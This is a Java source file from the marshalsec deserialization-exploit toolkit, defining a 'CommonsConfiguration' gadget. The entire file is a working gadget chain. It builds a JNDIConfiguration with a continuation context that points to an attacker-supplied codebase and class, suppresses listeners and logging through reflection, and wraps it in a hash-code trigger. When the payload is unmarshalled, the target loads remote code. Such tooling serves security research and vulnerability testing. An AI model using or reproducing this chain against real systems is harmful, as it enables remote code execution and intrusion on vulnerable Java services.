/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec.gadgets;


import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.Collections;

import javax.naming.NamingException;
import javax.naming.directory.DirContext;

import org.apache.commons.configuration.Configuration;
import org.apache.commons.configuration.JNDIConfiguration;
import org.apache.commons.logging.impl.NoOpLog;

import marshalsec.MarshallerBase;
import marshalsec.UtilFactory;
import marshalsec.util.Reflections;


/**
 * @author mbechler
 *
 */
public interface CommonsConfiguration extends Gadget {

    @Args ( minArgs = 2, args = {
        "codebase", "class"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
    } )
    @Primary
    default Object makeConfigurationMap ( UtilFactory uf, String[] args ) throws Exception {
        Object jc = makeConfiguration(uf, args);
        Class<?> cl = Class.forName("org.apache.commons.configuration.ConfigurationMap");
        Constructor<?> cons = cl.getDeclaredConstructor(Configuration.class);
        cons.setAccessible(true);
        return uf.makeHashCodeTrigger(cons.newInstance(jc));
    }


    @Args ( minArgs = 2, args = {
        "codebase", "class"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
    } )
    default Object makeConfiguration ( UtilFactory uf, String[] args ) throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException, NamingException, Exception {
        DirContext ctx = JDKUtil.makeContinuationContext(args[ 0 ], args[ 1 ]);

        JNDIConfiguration jc = new JNDIConfiguration();
        jc.setContext(ctx);
        jc.setPrefix("foo");

        Reflections.setFieldValue(jc, "errorListeners", Collections.EMPTY_LIST);
        Reflections.setFieldValue(jc, "listeners", Collections.EMPTY_LIST);
        Reflections.setFieldValue(jc, "log", new NoOpLog());
        return jc;
    }

}
